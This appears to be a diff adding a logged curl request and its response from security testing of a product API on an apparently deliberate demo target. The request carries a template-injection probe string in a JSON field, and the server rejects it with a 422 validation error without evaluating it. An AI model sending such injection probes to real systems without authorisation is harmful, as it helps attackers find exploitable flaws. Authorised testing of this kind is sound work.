@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/json' -d '{"skip": "{{340*334}}${340*334}#{340*334}<%=340*334%>"}' https://duck-store.escape.tech/api/v1/products/
+# exit_code: 0
+# ---
+
+{"detail":[{"type":"missing","loc":["body","name"],"msg":"Field required","input":{"skip":"{{340*334}}${340*334}#{340*334}<%=340*334%>"}},{"type":"missing","loc":["body","price"],"msg":"Field required","input":{"skip":"{{340*334}}${340*334}#{340*334}<%=340*334%>"}},{"type":"missing","loc":["body","stock"],"msg":"Field required","input":{"skip":"{{340*334}}${340*334}#{340*334}<%=340*334%>"}}]}
+HTTP_STATUS:422
+CTYPE:application/json
